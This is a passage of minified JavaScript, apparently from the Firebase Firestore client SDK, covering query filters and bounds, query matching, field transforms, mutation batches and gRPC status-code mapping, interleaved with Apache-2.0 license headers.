 */class zi{constructor(e,t){this.position=e,this.inclusive=t}}function Kw(e,t,n){let r=0;for(let i=0;i<e.position.length;i++){const s=t[i],o=e.position[i];if(r=s.field.isKeyField()?B.comparator(B.fromName(o.referenceValue),n.key):Ui(o,n.data.field(s.field)),"desc"===s.dir&&(r*=-1),0!==r)break}return r}function Qw(e,t){if(null===e)return null===t;if(null===t||e.inclusive!==t.inclusive||e.position.length!==t.position.length)return!1;for(let n=0;n<e.position.length;n++)if(!Sr(e.position[n],t.position[n]))return!1;return!0}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Wo{constructor(e,t="asc"){this.field=e,this.dir=t}}function I$(e,t){return e.dir===t.dir&&e.field.isEqual(t.field)}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lx{}class ye extends lx{constructor(e,t,n){super(),this.field=e,this.op=t,this.value=n}static create(e,t,n){return e.isKeyField()?"in"===t||"not-in"===t?this.createKeyFieldInFilter(e,t,n):new k$(e,t,n):"array-contains"===t?new N$(e,n):"in"===t?new px(e,n):"not-in"===t?new M$(e,n):"array-contains-any"===t?new R$(e,n):new ye(e,t,n)}static createKeyFieldInFilter(e,t,n){return"in"===t?new D$(e,n):new C$(e,n)}matches(e){const t=e.data.field(this.field);return"!="===this.op?null!==t&&this.matchesComparison(Ui(t,this.value)):null!==t&&Vs(this.value)===Vs(t)&&this.matchesComparison(Ui(t,this.value))}matchesComparison(e){switch(this.op){case"<":return e<0;case"<=":return e<=0;case"==":return 0===e;case"!=":return 0!==e;case">":return e>0;case">=":return e>=0;default:return G()}}isInequality(){return["<","<=",">",">=","!=","not-in"].indexOf(this.op)>=0}getFlattenedFilters(){return[this]}getFilters(){return[this]}getFirstInequalityField(){return this.isInequality()?this.field:null}}class Ae extends lx{constructor(e,t){super(),this.filters=e,this.op=t,this.ht=null}static create(e,t){return new Ae(e,t)}matches(e){return oa(this)?void 0===this.filters.find((t=>!t.matches(e))):void 0!==this.filters.find((t=>t.matches(e)))}getFlattenedFilters(){return null!==this.ht||(this.ht=this.filters.reduce(((e,t)=>e.concat(t.getFlattenedFilters())),[])),this.ht}getFilters(){return Object.assign([],this.filters)}getFirstInequalityField(){const e=this.lt((e=>e.isInequality()));return null!==e?e.field:null}lt(e){for(const t of this.getFlattenedFilters())if(e(t))return t;return null}}function oa(e){return"and"===e.op}function tg(e){return"or"===e.op}function tv(e){return ux(e)&&oa(e)}function ux(e){for(const t of e.filters)if(t instanceof Ae)return!1;return!0}function ng(e){if(e instanceof ye)return e.field.canonicalString()+e.op.toString()+sa(e.value);if(tv(e))return e.filters.map((e=>ng(e))).join(",");{const t=e.filters.map((e=>ng(e))).join(",");return`${e.op}(${t})`}}function cx(e,t){return e instanceof ye?(n=e,(r=t)instanceof ye&&n.op===r.op&&n.field.isEqual(r.field)&&Sr(n.value,r.value)):e instanceof Ae?function(e,t){return t instanceof Ae&&e.op===t.op&&e.filters.length===t.filters.length&&e.filters.reduce(((e,n,r)=>e&&cx(n,t.filters[r])),!0)}(e,t):void G();var n,r}function hx(e,t){const n=e.filters.concat(t);return Ae.create(n,e.op)}function dx(e){return e instanceof ye?`${(t=e).field.canonicalString()} ${t.op} ${sa(t.value)}`:e instanceof Ae?function(e){return e.op.toString()+" {"+e.getFilters().map(dx).join(" ,")+"}"}(e):"Filter";var t}class k$ extends ye{constructor(e,t,n){super(e,t,n),this.key=B.fromName(n.referenceValue)}matches(e){const t=B.comparator(e.key,this.key);return this.matchesComparison(t)}}class D$ extends ye{constructor(e,t){super(e,"in",t),this.keys=fx("in",t)}matches(e){return this.keys.some((t=>t.isEqual(e.key)))}}class C$ extends ye{constructor(e,t){super(e,"not-in",t),this.keys=fx("not-in",t)}matches(e){return!this.keys.some((t=>t.isEqual(e.key)))}}function fx(e,t){var n;return((null===(n=t.arrayValue)||void 0===n?void 0:n.values)||[]).map((e=>B.fromName(e.referenceValue)))}class N$ extends ye{constructor(e,t){super(e,"array-contains",t)}matches(e){const t=e.data.field(this.field);return lu(t)&&au(t.arrayValue,this.value)}}class px extends ye{constructor(e,t){super(e,"in",t)}matches(e){const t=e.data.field(this.field);return null!==t&&au(this.value.arrayValue,t)}}class M$ extends ye{constructor(e,t){super(e,"not-in",t)}matches(e){if(au(this.value.arrayValue,{nullValue:"NULL_VALUE"}))return!1;const t=e.data.field(this.field);return null!==t&&!au(this.value.arrayValue,t)}}class R$ extends ye{constructor(e,t){super(e,"array-contains-any",t)}matches(e){const t=e.data.field(this.field);return!(!lu(t)||!t.arrayValue.values)&&t.arrayValue.values.some((e=>au(this.value.arrayValue,e)))}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class A${constructor(e,t=null,n=[],r=[],i=null,s=null,o=null){this.path=e,this.collectionGroup=t,this.orderBy=n,this.filters=r,this.limit=i,this.startAt=s,this.endAt=o,this.ft=null}}function rg(e,t=null,n=[],r=[],i=null,s=null,o=null){return new A$(e,t,n,r,i,s,o)}function zs(e){const t=q(e);if(null===t.ft){let e=t.path.canonicalString();null!==t.collectionGroup&&(e+="|cg:"+t.collectionGroup),e+="|f:",e+=t.filters.map((e=>ng(e))).join(","),e+="|ob:",e+=t.orderBy.map((e=>{return(t=e).field.canonicalString()+t.dir;var t})).join(","),Ou(t.limit)||(e+="|l:",e+=t.limit),t.startAt&&(e+="|lb:",e+=t.startAt.inclusive?"b:":"a:",e+=t.startAt.position.map((e=>sa(e))).join(",")),t.endAt&&(e+="|ub:",e+=t.endAt.inclusive?"a:":"b:",e+=t.endAt.position.map((e=>sa(e))).join(",")),t.ft=e}return t.ft}function Pu(e,t){if(e.limit!==t.limit||e.orderBy.length!==t.orderBy.length)return!1;for(let n=0;n<e.orderBy.length;n++)if(!I$(e.orderBy[n],t.orderBy[n]))return!1;if(e.filters.length!==t.filters.length)return!1;for(let n=0;n<e.filters.length;n++)if(!cx(e.filters[n],t.filters[n]))return!1;return e.collectionGroup===t.collectionGroup&&!!e.path.isEqual(t.path)&&!!Qw(e.startAt,t.startAt)&&Qw(e.endAt,t.endAt)}function Kh(e){return B.isDocumentKey(e.path)&&null===e.collectionGroup&&0===e.filters.length}function Qh(e,t){return e.filters.filter((e=>e instanceof ye&&e.field.isEqual(t)))}function Xw(e,t,n){let r=th,i=!0;for(const n of Qh(e,t)){let e=th,t=!0;switch(n.op){case"<":case"<=":e=T$(n.value);break;case"==":case"in":case">=":e=n.value;break;case">":e=n.value,t=!1;break;case"!=":case"not-in":e=th}Gw({value:r,inclusive:i},{value:e,inclusive:t})<0&&(r=e,i=t)}if(null!==n)for(let s=0;s<e.orderBy.length;++s)if(e.orderBy[s].field.isEqual(t)){const e=n.position[s];Gw({value:r,inclusive:i},{value:e,inclusive:n.inclusive})<0&&(r=e,i=n.inclusive);break}return{value:r,inclusive:i}}function Jw(e,t,n){let r=vi,i=!0;for(const n of Qh(e,t)){let e=vi,t=!0;switch(n.op){case">=":case">":e=x$(n.value),t=!1;break;case"==":case"in":case"<=":e=n.value;break;case"<":e=n.value,t=!1;break;case"!=":case"not-in":e=vi}Hw({value:r,inclusive:i},{value:e,inclusive:t})>0&&(r=e,i=t)}if(null!==n)for(let s=0;s<e.orderBy.length;++s)if(e.orderBy[s].field.isEqual(t)){const e=n.position[s];Hw({value:r,inclusive:i},{value:e,inclusive:n.inclusive})>0&&(r=e,i=n.inclusive);break}return{value:r,inclusive:i}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Jr{constructor(e,t=null,n=[],r=[],i=null,s="F",o=null,a=null){this.path=e,this.collectionGroup=t,this.explicitOrderBy=n,this.filters=r,this.limit=i,this.limitType=s,this.startAt=o,this.endAt=a,this.dt=null,this._t=null,this.startAt,this.endAt}}function mx(e,t,n,r,i,s,o,a){return new Jr(e,t,n,r,i,s,o,a)}function Ea(e){return new Jr(e)}function Zw(e){return 0===e.filters.length&&null===e.limit&&null==e.startAt&&null==e.endAt&&(0===e.explicitOrderBy.length||1===e.explicitOrderBy.length&&e.explicitOrderBy[0].field.isKeyField())}function nv(e){return e.explicitOrderBy.length>0?e.explicitOrderBy[0].field:null}function Wd(e){for(const t of e.filters){const e=t.getFirstInequalityField();if(null!==e)return e}return null}function rv(e){return null!==e.collectionGroup}function Rs(e){const t=q(e);if(null===t.dt){t.dt=[];const e=Wd(t),n=nv(t);if(null!==e&&null===n)e.isKeyField()||t.dt.push(new Wo(e)),t.dt.push(new Wo(gt.keyField(),"asc"));else{let e=!1;for(const n of t.explicitOrderBy)t.dt.push(n),n.field.isKeyField()&&(e=!0);if(!e){const e=t.explicitOrderBy.length>0?t.explicitOrderBy[t.explicitOrderBy.length-1].dir:"asc";t.dt.push(new Wo(gt.keyField(),e))}}}return t.dt}function kn(e){const t=q(e);if(!t._t)if("F"===t.limitType)t._t=rg(t.path,t.collectionGroup,Rs(t),t.filters,t.limit,t.startAt,t.endAt);else{const e=[];for(const n of Rs(t)){const t="desc"===n.dir?"asc":"desc";e.push(new Wo(n.field,t))}const n=t.endAt?new zi(t.endAt.position,t.endAt.inclusive):null,r=t.startAt?new zi(t.startAt.position,t.startAt.inclusive):null;t._t=rg(t.path,t.collectionGroup,e,t.filters,t.limit,n,r)}return t._t}function ig(e,t){t.getFirstInequalityField(),Wd(e);const n=e.filters.concat([t]);return new Jr(e.path,e.collectionGroup,e.explicitOrderBy.slice(),n,e.limit,e.limitType,e.startAt,e.endAt)}function Xh(e,t,n){return new Jr(e.path,e.collectionGroup,e.explicitOrderBy.slice(),e.filters.slice(),t,n,e.startAt,e.endAt)}function $u(e,t){return Pu(kn(e),kn(t))&&e.limitType===t.limitType}function gx(e){return`${zs(kn(e))}|lt:${e.limitType}`}function sg(e){return`Query(target=${function(e){let t=e.path.canonicalString();return null!==e.collectionGroup&&(t+=" collectionGroup="+e.collectionGroup),e.filters.length>0&&(t+=`, filters: [${e.filters.map((e=>dx(e))).join(", ")}]`),Ou(e.limit)||(t+=", limit: "+e.limit),e.orderBy.length>0&&(t+=`, orderBy: [${e.orderBy.map((e=>{return`${(t=e).field.canonicalString()} (${t.dir})`;var t})).join(", ")}]`),e.startAt&&(t+=", startAt: ",t+=e.startAt.inclusive?"b:":"a:",t+=e.startAt.position.map((e=>sa(e))).join(",")),e.endAt&&(t+=", endAt: ",t+=e.endAt.inclusive?"a:":"b:",t+=e.endAt.position.map((e=>sa(e))).join(",")),`Target(${t})`}(kn(e))}; limitType=${e.limitType})`}function Lu(e,t){return t.isFoundDocument()&&function(e,t){const n=t.key.path;return null!==e.collectionGroup?t.key.hasCollectionId(e.collectionGroup)&&e.path.isPrefixOf(n):B.isDocumentKey(e.path)?e.path.isEqual(n):e.path.isImmediateParentOf(n)}(e,t)&&function(e,t){for(const n of Rs(e))if(!n.field.isKeyField()&&null===t.data.field(n.field))return!1;return!0}(e,t)&&function(e,t){for(const n of e.filters)if(!n.matches(t))return!1;return!0}(e,t)&&(r=t,!((n=e).startAt&&!function(e,t,n){const r=Kw(e,t,n);return e.inclusive?r<=0:r<0}(n.startAt,Rs(n),r)||n.endAt&&!function(e,t,n){const r=Kw(e,t,n);return e.inclusive?r>=0:r>0}(n.endAt,Rs(n),r)));var n,r}function yx(e){return e.collectionGroup||(e.path.length%2==1?e.path.lastSegment():e.path.get(e.path.length-2))}function vx(e){return(t,n)=>{let r=!1;for(const i of Rs(e)){const e=b$(i,t,n);if(0!==e)return e;r=r||i.field.isKeyField()}return 0}}function b$(e,t,n){const r=e.field.isKeyField()?B.comparator(t.key,n.key):function(e,t,n){const r=t.data.field(e),i=n.data.field(e);return null!==r&&null!==i?Ui(r,i):G()}(e.field,t,n);switch(e.dir){case"asc":return r;case"desc":return-1*r;default:return G()}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ji{constructor(e,t){this.mapKeyFn=e,this.equalsFn=t,this.inner={},this.innerSize=0}get(e){const t=this.mapKeyFn(e),n=this.inner[t];if(void 0!==n)for(const[t,r]of n)if(this.equalsFn(t,e))return r}has(e){return void 0!==this.get(e)}set(e,t){const n=this.mapKeyFn(e),r=this.inner[n];if(void 0===r)return this.inner[n]=[[e,t]],void this.innerSize++;for(let n=0;n<r.length;n++)if(this.equalsFn(r[n][0],e))return void(r[n]=[e,t]);r.push([e,t]),this.innerSize++}delete(e){const t=this.mapKeyFn(e),n=this.inner[t];if(void 0===n)return!1;for(let r=0;r<n.length;r++)if(this.equalsFn(n[r][0],e))return 1===n.length?delete this.inner[t]:n.splice(r,1),this.innerSize--,!0;return!1}forEach(e){eo(this.inner,((t,n)=>{for(const[t,r]of n)e(t,r)}))}isEmpty(){return ix(this.inner)}size(){return this.innerSize}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const O$=new Be(B.comparator);function _n(){return O$}const wx=new Be(B.comparator);function ul(...e){let t=wx;for(const n of e)t=t.insert(n.key,n);return t}function Sx(e){let t=wx;return e.forEach(((e,n)=>t=t.insert(e,n.overlayedDocument))),t}function mr(){return Dl()}function _x(){return Dl()}function Dl(){return new Ji((e=>e.toString()),((e,t)=>e.isEqual(t)))}const P$=new Be(B.comparator),$$=new He(B.comparator);function ce(...e){let t=$$;for(const n of e)t=t.add(n);return t}const L$=new He(ue);function iv(){return L$}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ex(e,t){if(e.useProto3Json){if(isNaN(t))return{doubleValue:"NaN"};if(t===1/0)return{doubleValue:"Infinity"};if(t===-1/0)return{doubleValue:"-Infinity"}}return{doubleValue:su(t)?"-0":t}}function Tx(e){return{integerValue:""+e}}function xx(e,t){return ZT(t)?Tx(t):Ex(e,t)}
/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Gd{constructor(){this._=void 0}}function F$(e,t,n){return e instanceof aa?function(e,t){const n={fields:{__type__:{stringValue:"server_timestamp"},__local_write_time__:{timestampValue:{seconds:e.seconds,nanos:e.nanoseconds}}}};return t&&Yd(t)&&(t=ev(t)),t&&(n.fields.__previous_value__=t),{mapValue:n}}(n,t):e instanceof Bs?kx(e,t):e instanceof js?Dx(e,t):function(e,t){const n=Ix(e,t),r=eS(n)+eS(e.wt);return eg(n)&&eg(e.wt)?Tx(r):Ex(e.serializer,r)}(e,t)}function V$(e,t,n){return e instanceof Bs?kx(e,t):e instanceof js?Dx(e,t):n}function Ix(e,t){return e instanceof la?eg(r=t)||(n=r)&&"doubleValue"in n?t:{integerValue:0}:null;var n,r}class aa extends Gd{}class Bs extends Gd{constructor(e){super(),this.elements=e}}function kx(e,t){const n=Cx(t);for(const t of e.elements)n.some((e=>Sr(e,t)))||n.push(t);return{arrayValue:{values:n}}}class js extends Gd{constructor(e){super(),this.elements=e}}function Dx(e,t){let n=Cx(t);for(const t of e.elements)n=n.filter((e=>!Sr(e,t)));return{arrayValue:{values:n}}}class la extends Gd{constructor(e,t){super(),this.serializer=e,this.wt=t}}function eS(e){return ut(e.integerValue||e.doubleValue)}function Cx(e){return lu(e)&&e.arrayValue.values?e.arrayValue.values.slice():[]}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fu{constructor(e,t){this.field=e,this.transform=t}}function U$(e,t){return e.field.isEqual(t.field)&&(n=e.transform,r=t.transform,n instanceof Bs&&r instanceof Bs||n instanceof js&&r instanceof js?ia(n.elements,r.elements,Sr):n instanceof la&&r instanceof la?Sr(n.wt,r.wt):n instanceof aa&&r instanceof aa);var n,r}class z${constructor(e,t){this.version=e,this.transformResults=t}}class Ze{constructor(e,t){this.updateTime=e,this.exists=t}static none(){return new Ze}static exists(e){return new Ze(void 0,e)}static updateTime(e){return new Ze(e)}get isNone(){return void 0===this.updateTime&&void 0===this.exists}isEqual(e){return this.exists===e.exists&&(this.updateTime?!!e.updateTime&&this.updateTime.isEqual(e.updateTime):!e.updateTime)}}function rh(e,t){return void 0!==e.updateTime?t.isFoundDocument()&&t.version.isEqual(e.updateTime):void 0===e.exists||e.exists===t.isFoundDocument()}class Hd{}function Nx(e,t){if(!e.hasLocalMutations||t&&0===t.fields.length)return null;if(null===t)return e.isNoDocument()?new xa(e.key,Ze.none()):new Ta(e.key,e.data,Ze.none());{const n=e.data,r=Yt.empty();let i=new He(gt.comparator);for(let e of t.fields)if(!i.has(e)){let t=n.field(e);null===t&&e.length>1&&(e=e.popLast(),t=n.field(e)),null===t?r.delete(e):r.set(e,t),i=i.add(e)}return new Zr(e.key,r,new Sn(i.toArray()),Ze.none())}}function B$(e,t,n){var r;e instanceof Ta?function(e,t,n){const r=e.value.clone(),i=nS(e.fieldTransforms,t,n.transformResults);r.setAll(i),t.convertToFoundDocument(n.version,r).setHasCommittedMutations()}(e,t,n):e instanceof Zr?function(e,t,n){if(!rh(e.precondition,t))return void t.convertToUnknownDocument(n.version);const r=nS(e.fieldTransforms,t,n.transformResults),i=t.data;i.setAll(Mx(e)),i.setAll(r),t.convertToFoundDocument(n.version,i).setHasCommittedMutations()}(e,t,n):(r=n,t.convertToNoDocument(r.version).setHasCommittedMutations())}function Cl(e,t,n,r){return e instanceof Ta?function(e,t,n,r){if(!rh(e.precondition,t))return n;const i=e.value.clone(),s=rS(e.fieldTransforms,r,t);return i.setAll(s),t.convertToFoundDocument(t.version,i).setHasLocalMutations(),null}(e,t,n,r):e instanceof Zr?function(e,t,n,r){if(!rh(e.precondition,t))return n;const i=rS(e.fieldTransforms,r,t),s=t.data;return s.setAll(Mx(e)),s.setAll(i),t.convertToFoundDocument(t.version,s).setHasLocalMutations(),null===n?null:n.unionWith(e.fieldMask.fields).unionWith(e.fieldTransforms.map((e=>e.field)))}(e,t,n,r):(i=t,s=n,rh(e.precondition,i)?(i.convertToNoDocument(i.version).setHasLocalMutations(),null):s);var i,s}function j$(e,t){let n=null;for(const r of e.fieldTransforms){const e=t.data.field(r.field),i=Ix(r.transform,e||null);null!=i&&(null===n&&(n=Yt.empty()),n.set(r.field,i))}return n||null}function tS(e,t){return e.type===t.type&&!!e.key.isEqual(t.key)&&!!e.precondition.isEqual(t.precondition)&&(n=e.fieldTransforms,r=t.fieldTransforms,!!(void 0===n&&void 0===r||n&&r&&ia(n,r,((e,t)=>U$(e,t)))))&&(0===e.type?e.value.isEqual(t.value):1!==e.type||e.data.isEqual(t.data)&&e.fieldMask.isEqual(t.fieldMask));var n,r}class Ta extends Hd{constructor(e,t,n,r=[]){super(),this.key=e,this.value=t,this.precondition=n,this.fieldTransforms=r,this.type=0}getFieldMask(){return null}}class Zr extends Hd{constructor(e,t,n,r,i=[]){super(),this.key=e,this.data=t,this.fieldMask=n,this.precondition=r,this.fieldTransforms=i,this.type=1}getFieldMask(){return this.fieldMask}}function Mx(e){const t=new Map;return e.fieldMask.fields.forEach((n=>{if(!n.isEmpty()){const r=e.data.field(n);t.set(n,r)}})),t}function nS(e,t,n){const r=new Map;te(e.length===n.length);for(let i=0;i<n.length;i++){const s=e[i],o=s.transform,a=t.data.field(s.field);r.set(s.field,V$(o,a,n[i]))}return r}function rS(e,t,n){const r=new Map;for(const i of e){const e=i.transform,s=n.data.field(i.field);r.set(i.field,F$(e,s,t))}return r}class xa extends Hd{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=2,this.fieldTransforms=[]}getFieldMask(){return null}}class sv extends Hd{constructor(e,t){super(),this.key=e,this.precondition=t,this.type=3,this.fieldTransforms=[]}getFieldMask(){return null}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ov{constructor(e,t,n,r){this.batchId=e,this.localWriteTime=t,this.baseMutations=n,this.mutations=r}applyToRemoteDocument(e,t){const n=t.mutationResults;for(let t=0;t<this.mutations.length;t++){const r=this.mutations[t];r.key.isEqual(e.key)&&B$(r,e,n[t])}}applyToLocalView(e,t){for(const n of this.baseMutations)n.key.isEqual(e.key)&&(t=Cl(n,e,t,this.localWriteTime));for(const n of this.mutations)n.key.isEqual(e.key)&&(t=Cl(n,e,t,this.localWriteTime));return t}applyToLocalDocumentSet(e,t){const n=_x();return this.mutations.forEach((r=>{const i=e.get(r.key),s=i.overlayedDocument;let o=this.applyToLocalView(s,i.mutatedFields);o=t.has(r.key)?null:o;const a=Nx(s,o);null!==a&&n.set(r.key,a),s.isValidDocument()||s.convertToNoDocument(ee.min())})),n}keys(){return this.mutations.reduce(((e,t)=>e.add(t.key)),ce())}isEqual(e){return this.batchId===e.batchId&&ia(this.mutations,e.mutations,((e,t)=>tS(e,t)))&&ia(this.baseMutations,e.baseMutations,((e,t)=>tS(e,t)))}}class av{constructor(e,t,n,r){this.batch=e,this.commitVersion=t,this.mutationResults=n,this.docVersions=r}static from(e,t,n){te(e.mutations.length===n.length);let r=P$;const i=e.mutations;for(let e=0;e<i.length;e++)r=r.insert(i[e].key,n[e].version);return new av(e,t,n,r)}}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lv{constructor(e,t){this.largestBatchId=e,this.mutation=t}getKey(){return this.mutation.key}isEqual(e){return null!==e&&this.mutation===e.mutation}toString(){return`Overlay{\n      largestBatchId: ${this.largestBatchId},\n      mutation: ${this.mutation.toString()}\n    }`}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class q${constructor(e,t){this.count=e,this.unchangedNames=t
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}var wt,Se;function Rx(e){switch(e){default:return G();case M.CANCELLED:case M.UNKNOWN:case M.DEADLINE_EXCEEDED:case M.RESOURCE_EXHAUSTED:case M.INTERNAL:case M.UNAVAILABLE:case M.UNAUTHENTICATED:return!1;case M.INVALID_ARGUMENT:case M.NOT_FOUND:case M.ALREADY_EXISTS:case M.PERMISSION_DENIED:case M.FAILED_PRECONDITION:case M.ABORTED:case M.OUT_OF_RANGE:case M.UNIMPLEMENTED:case M.DATA_LOSS:return!0}}function Ax(e){if(void 0===e)return mt("GRPC error has no .code"),M.UNKNOWN;switch(e){case wt.OK:return M.OK;case wt.CANCELLED:return M.CANCELLED;case wt.UNKNOWN:return M.UNKNOWN;case wt.DEADLINE_EXCEEDED:return M.DEADLINE_EXCEEDED;case wt.RESOURCE_EXHAUSTED:return M.RESOURCE_EXHAUSTED;case wt.INTERNAL:return M.INTERNAL;case wt.UNAVAILABLE:return M.UNAVAILABLE;case wt.UNAUTHENTICATED:return M.UNAUTHENTICATED;case wt.INVALID_ARGUMENT:return M.INVALID_ARGUMENT;case wt.NOT_FOUND:return M.NOT_FOUND;case wt.ALREADY_EXISTS:return M.ALREADY_EXISTS;case wt.PERMISSION_DENIED:return M.PERMISSION_DENIED;case wt.FAILED_PRECONDITION:return M.FAILED_PRECONDITION;case wt.ABORTED:return M.ABORTED;case wt.OUT_OF_RANGE:return M.OUT_OF_RANGE;case wt.UNIMPLEMENTED:return M.UNIMPLEMENTED;case wt.DATA_LOSS:return M.DATA_LOSS;default:return G()}}(Se=wt||(wt={}))[Se.OK=0]="OK",Se[Se.CANCELLED=1]="CANCELLED",Se[Se.UNKNOWN=2]="UNKNOWN",Se[Se.INVALID_ARGUMENT=3]="INVALID_ARGUMENT",Se[Se.DEADLINE_EXCEEDED=4]="DEADLINE_EXCEEDED",Se[Se.NOT_FOUND=5]="NOT_FOUND",Se[Se.ALREADY_EXISTS=6]="ALREADY_EXISTS",Se[Se.PERMISSION_DENIED=7]="PERMISSION_DENIED",Se[Se.UNAUTHENTICATED=16]="UNAUTHENTICATED",Se[Se.RESOURCE_EXHAUSTED=8]="RESOURCE_EXHAUSTED",Se[Se.FAILED_PRECONDITION=9]="FAILED_PRECONDITION",Se[Se.ABORTED=10]="ABORTED",Se[Se.OUT_OF_RANGE=11]="OUT_OF_RANGE",Se[Se.UNIMPLEMENTED=12]="UNIMPLEMENTED",Se[Se.INTERNAL=13]="INTERNAL",Se[Se.UNAVAILABLE=14]="UNAVAILABLE",Se[Se.DATA_LOSS=15]="DATA_LOSS";
/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
